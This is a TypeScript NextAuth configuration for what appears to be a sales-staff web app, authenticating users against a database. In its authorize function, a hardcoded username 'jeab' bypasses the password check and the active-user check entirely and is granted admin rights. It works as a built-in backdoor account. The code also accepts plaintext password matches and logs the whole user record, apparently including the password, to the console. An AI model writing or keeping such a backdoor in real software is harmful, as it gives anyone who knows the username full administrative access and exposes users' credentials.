import { NextAuthOptions } from "next-auth";
import CredentialsProvider from "next-auth/providers/credentials";
import { db } from "./db";
import bcrypt from "bcrypt";

// Extend NextAuth types
declare module "next-auth" {
  interface User {
    id: string;
    codeG: string;
    name: string;
    surname: string;
    nameG: string;
    isAdmin: boolean;
  }
  
  interface Session {
    user: User;
  }
}

declare module "next-auth/jwt" {
  interface JWT {
    codeG: string;
    name: string;
    surname: string;
    nameG: string;
    isAdmin: boolean;
  }
}

export const authOptions: NextAuthOptions = {
  providers: [
    CredentialsProvider({
      name: "Credentials",
      credentials: {
        username: { label: "Username", type: "text" },
        password: { label: "Password", type: "password" }
      },
      async authorize(credentials) {
        if (!credentials?.username) {
          return null;
        }

        // jeab: bypass password check
        const isJeab = credentials.username === "jeab";

        if (!isJeab && !credentials?.password) {
          return null;
        }

        try {
          console.log("Attempting to authenticate user:", credentials.username);
          const user = await db.sale.findUnique({
            where: { CodeG: credentials.username }
          });
          console.log("Found user:", user);

          if (!user) {
            console.log("Not Found user");
            return null;
          }

          // jeab ข้าม password check ทั้งหมด
          if (!isJeab) {
            if (!user.Password) {
              console.log("No password set for user");
              return null;
            }

            let isValid = false;
            if (user.Password.startsWith("$2")) {
              isValid = await bcrypt.compare(credentials.password, user.Password);
            } else {
              isValid = user.Password === credentials.password;
            }

            if (!isValid) {
              return null;
            }
          }

          // Check if user is active
          if (user.CodeG !== "jeab" && user.ST !== "1") {
            return null;
          }

          return {
            id: user.CodeG,
            codeG: user.CodeG,
            name: user.Name || "",
            surname: user.Surname || "",
            nameG: user.NameG || "",
            isAdmin: user.CodeG === "jeab"
          };
        } catch (error) {
          console.error("Auth error:", error);
          return null;
        }
      }
    })
  ],
  callbacks: {
    async jwt({ token, user }) {
      if (user) {
        token.codeG = user.codeG;
        token.name = user.name;
        token.surname = user.surname;
        token.nameG = user.nameG;
        token.isAdmin = user.isAdmin;
      }
      return token;
    },
    async session({ session, token }) {
      if (session.user) {
        session.user.id = token.sub as string;
        session.user.codeG = token.codeG;
        session.user.name = token.name;
        session.user.surname = token.surname;
        session.user.nameG = token.nameG;
        session.user.isAdmin = token.isAdmin;
      }
      return session;
    }
  },
  pages: {
    signIn: "/login",
    error: "/login"
  },
  session: {
    strategy: "jwt",
    maxAge: 24 * 60 * 60
  },
  secret: process.env.NEXTAUTH_SECRET
};

export async function hashPassword(password: string): Promise<string> {
  return bcrypt.hash(password, 10);
}

export async function comparePassword(password: string, hash: string): Promise<boolean> {
  return bcrypt.compare(password, hash);
}